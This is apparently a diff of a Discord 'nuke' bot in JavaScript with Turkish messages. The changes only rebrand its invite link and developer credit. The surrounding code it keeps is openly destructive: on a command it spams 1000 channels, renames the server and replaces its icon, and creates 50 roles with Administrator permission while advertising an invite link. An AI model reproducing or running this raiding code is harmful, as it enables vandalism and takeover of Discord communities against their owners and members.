@@ -13,7 +13,7 @@ client.login(config.token);
 // Event handler
 client.once('ready', () => {
   console.log(`Bot ${client.user.tag} olarak giriş yaptı.`);
-  client.user.setActivity('discord.gg/siyahbeyaz', { type: 'PLAYING' });
+  client.user.setActivity('discord.gg/react', { type: 'PLAYING' });
 });
 
 // Event handler for message creation
@@ -26,7 +26,7 @@ client.on('messageCreate', async (msg) => {
       const channelsToCreate = [];
       let i = 0;
       while (i < 1000) {
-        channelsToCreate.push({ name: 'discord.gg/siyahbeyaz', type: ChannelType.GuildText });
+        channelsToCreate.push({ name: 'discord.gg/react', type: ChannelType.GuildText });
         i++;
       }
 
@@ -55,7 +55,7 @@ client.on('messageCreate', async (msg) => {
       // Update guild settings
       try {
         await msg.guild.setIcon('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
-        await msg.guild.setName('discord.gg/siyahbeyaz');
+        await msg.guild.setName('discord.gg/react');
       } catch (err) {
         console.error('Failed to update guild settings:', err);
       }
@@ -74,7 +74,7 @@ client.on('messageCreate', async (msg) => {
       // Update bot settings
       try {
         await client.user.setAvatar('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
-        await client.user.setUsername('discord.gg/siyahbeyaz UWU');
+        await client.user.setUsername('discord.gg/react UWU');
       } catch (err) {
         console.error('Failed to update bot settings:', err);
       }
@@ -128,7 +128,7 @@ client.on('messageCreate', async (msg) => {
   let count = 0;
   while (count < 50) {
     await msg.guild.roles.create({
-      name: 'discord.gg/siyahbeyaz',
+      name: 'discord.gg/react',
       color: 'FF3E00',
       permissions: [PermissionFlagsBits.Administrator]
     }).then(() => console.log(`Rol ${count + 1} oluşturuldu.`)).catch(err => console.error(`Rol oluşturma hatası: ${err}`));
@@ -162,7 +162,7 @@ client.on('messageCreate', async (msg) => {
             url: 'https://cdn.discordapp.com/attachments/1173319481599213639/1258825072248881292/a_0b05ce4dbc49d501b989eb54b99aa805.gif?ex=668973b5&is=66882235&hm=39b19bd6622752e65ebbc3d26c855c5933a862970d56b807131a8592cd6f5922&',
           },
         color: 0xff0000,
-        footer: { text: 'Tekrardan Hoşgeldiniz Efendim.' }
+        footer: { text: 'Bot Developer : swenzyim' }
       };
       await msg.channel.send({ embeds: [embed] });
     }
